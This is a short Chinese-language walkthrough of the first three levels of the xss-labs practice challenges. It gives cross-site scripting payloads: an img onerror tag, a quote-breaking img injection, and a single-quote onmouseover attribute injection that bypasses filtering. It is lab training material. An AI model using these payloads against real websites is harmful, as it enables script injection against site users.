<center>xss-labs</center>



#### 1.	

最简单的xss题，通过上面的`name`传值，传的值会回显到前端的`欢迎用户`



此题通过简单的构造图片来完成就行了



payload:

```
?name=<img src=1 onerror=alert(1)>
```







#### 2.	



此题为搜索框的xss题。搜索的内容，搜索后会留在搜索框中。

所以此处尝试打破搜索框的束缚，构造一个图片xss



payload:

> 此处在搜索框中：

```
"><img src=1 onerror=alert(1)>
```





#### 3.	



此处`"`双引号，`<>`尖括号被过滤。但是`'`单引号没有被过滤，所以此处我们使用`'`来闭合，使用`//`来注释掉后面的双引号



然后给此标签添加属性`onmouseover=alert(1)`

payload:

> 此处在搜索框中：

```
' onmouseover=alert(1)//
```





